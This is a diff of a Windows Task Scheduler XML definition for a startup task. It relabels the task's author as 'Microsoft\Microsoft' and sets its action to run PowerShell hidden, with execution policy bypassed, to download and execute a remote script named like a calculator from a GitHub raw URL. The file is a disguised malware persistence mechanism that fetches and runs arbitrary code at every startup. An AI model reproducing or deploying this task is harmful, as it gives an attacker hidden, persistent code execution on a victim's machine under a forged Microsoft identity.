@@ -1,8 +1,8 @@
-﻿<?xml version="1.0" encoding="UTF-16"?>
+<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2025-01-22T21:09:38.2755195</Date>
-    <Author>NETBLOVED\NetBeloved</Author>
+    <Author>Microsoft\Microsoft</Author>
     <URI>\StartUp</URI>
   </RegistrationInfo>
   <Triggers>
@@ -48,7 +48,7 @@
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>-WindowStyle Hidden -Exec Bypass -NonInteractive -Command "while (-not (Test-Connection www.google.com -Count 1 -Quiet)) {Start-Sleep -Seconds 5}; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberforce49/s/refs/heads/main/calc.ps1')"</Arguments>
+      <Arguments>-Windowstyle Hidden -Exec Bypass -NonI -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberforce49/s/refs/heads/main/Calculator.ps1');"</Arguments>
     </Exec>
   </Actions>
 </Task>
